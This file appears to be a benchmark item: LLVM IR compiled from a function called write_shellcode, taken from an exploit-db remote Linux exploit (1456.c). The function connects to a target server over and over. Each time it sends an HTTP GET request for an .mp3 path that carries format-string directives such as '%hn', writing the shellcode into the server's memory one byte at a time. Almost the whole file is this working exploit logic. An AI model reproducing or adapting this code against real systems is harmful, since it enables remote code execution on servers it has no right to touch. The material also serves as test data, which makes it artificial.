; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1456.c_write_shellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1456.c_write_shellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }
%struct.sockaddr_in = type { i32 }

@shellcode = common dso_local global i32* null, align 8
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [35 x i8] c"GET /content/DD%s.mp3 HTTP/1.1\0D\0A\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"%%.%du%%%d$hn\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"%%%d$hn\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"GET /content/%s.mp3 HTTP/1.1\0D\0A\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @write_shellcode(i32 %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %15 = load i32*, i32** @shellcode, align 8
  %16 = call i32 @strlen(i32* %15)
  %17 = sub i32 -1073741832, %16
  store i32 %17, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %18 = load i32, i32* %11, align 4
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i64 %21
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i32 0, i32 0
  store i32 %18, i32* %23, align 4
  store i32 0, i32* %12, align 4
  br label %24

24:                                               ; preds = %110, %4
  %25 = load i32, i32* %12, align 4
  %26 = load i32*, i32** @shellcode, align 8
  %27 = call i32 @strlen(i32* %26)
  %28 = icmp slt i32 %25, %27
  br i1 %28, label %29, label %115

29:                                               ; preds = %24
  %30 = load i32, i32* %7, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @conn(i32 %32, i32 %30)
  store i32 %33, i32* %13, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

35:                                               ; preds = %29
  store i32 -1, i32* %5, align 4
  br label %116

36:                                               ; preds = %29
  %37 = load i32, i32* %12, align 4
  %38 = load i32, i32* %11, align 4
  %39 = call i32 @status(i32 %37, i32 %38)
  %40 = load i32, i32* %11, align 4
  %41 = sext i32 %40 to i64
  %42 = inttoptr i64 %41 to i8*
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %44 = bitcast i8* %43 to i8**
  store i8* %42, i8** %44, align 16
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 4
  store i8 0, i8* %45, align 4
  %46 = load i32, i32* %13, align 4
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %48 = call i32 @sockprintf(i32 %46, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8* %47)
  %49 = load i32, i32* %13, align 4
  %50 = call i32 @close(i32 %49)
  %51 = load i32*, i32** @shellcode, align 8
  %52 = load i32, i32* %12, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i32, i32* %51, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = icmp sgt i32 %55, 9
  br i1 %56, label %57, label %71

57:                                               ; preds = %36
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %59 = load i32*, i32** @shellcode, align 8
  %60 = load i32, i32* %12, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %65 = load i32, i32* %8, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i64 %66
  %68 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i32 0, i32 1
  %69 = load i32, i32* %68, align 4
  %70 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %58, i32 1024, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i32 %63, i32 %69)
  br label %94

71:                                               ; preds = %36
  %72 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %73 = load i32*, i32** @shellcode, align 8
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i32, i32* %73, i64 %75
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @memset(i8* %72, i32 65, i32 %77)
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %80 = load i32*, i32** @shellcode, align 8
  %81 = load i32, i32* %12, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i32, i32* %80, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %79, i64 %85
  %87 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %88 = load i32, i32* %8, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %87, i64 %89
  %91 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %90, i32 0, i32 1
  %92 = load i32, i32* %91, align 4
  %93 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %86, i32 1024, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i32 %92)
  br label %94

94:                                               ; preds = %71, %57
  %95 = load i32, i32* %7, align 4
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @conn(i32 %97, i32 %95)
  store i32 %98, i32* %13, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %101

100:                                              ; preds = %94
  store i32 -1, i32* %5, align 4
  br label %116

101:                                              ; preds = %94
  %102 = load i32, i32* %13, align 4
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %104 = call i32 @sockprintf(i32 %102, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i8* %103)
  %105 = load i32, i32* %13, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* %9, align 4
  %108 = mul nsw i32 %107, 100000
  %109 = call i32 @usleep(i32 %108)
  br label %110

110:                                              ; preds = %101
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %12, align 4
  %113 = load i32, i32* %11, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %11, align 4
  br label %24

115:                                              ; preds = %24
  store i32 0, i32* %5, align 4
  br label %116

116:                                              ; preds = %115, %100, %35
  %117 = load i32, i32* %5, align 4
  ret i32 %117
}

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @conn(i32, i32) #1

declare dso_local i32 @status(i32, i32) #1

declare dso_local i32 @sockprintf(i32, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i32, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
